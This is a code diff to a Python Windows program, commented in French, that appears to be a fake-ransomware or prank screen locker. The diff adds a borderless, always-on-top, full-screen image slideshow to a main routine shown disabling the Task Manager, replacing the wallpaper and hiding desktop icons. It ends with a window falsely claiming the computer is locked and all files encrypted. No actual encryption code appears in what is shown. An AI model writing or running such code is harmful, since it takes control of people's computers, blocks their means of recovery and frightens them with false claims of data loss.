@@ -4,6 +4,8 @@ import ctypes
 import os
 import tkinter as tk
 from tkinter import messagebox
+from PIL import Image, ImageTk
+import os
 import winreg
 import win32gui
 import win32con
@@ -31,6 +33,30 @@ def play_music_loop():
         pass  # Pour éviter la fermeture avec Ctrl+C dans la console
 
 #<<
+
+def slideshow_images():
+    root = tk.Tk()
+    root.overrideredirect(True)  # Sans barre de tâche
+    root.attributes("-topmost", True)
+    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
+
+    images = []
+    for i in range(1, 6):
+        path = f"skibidi{i}.png"
+        if os.path.exists(path):
+            img = Image.open(path)
+            img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
+            images.append(ImageTk.PhotoImage(img))
+
+    label = tk.Label(root)
+    label.pack()
+
+    def update(idx=0):
+        label.config(image=images[idx])
+        root.after(2000, lambda: update((idx + 1) % len(images)))  # 2000ms = 2sec
+
+    update()
+    root.mainloop()
 
 
 def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
@@ -190,8 +216,9 @@ def main():
     disable_task_manager()
     set_wallpaper("photo.jpeg")
     clear_desktop_icons()
-    show_final_window()
     play_music_loop()
+    slideshow_images()
+    show_final_window()
     
     # Fermer la fenêtre et arrêter le listener après 5 secondes
     loading_window.after(5000, lambda: [loading_window.destroy(), listener.stop()])
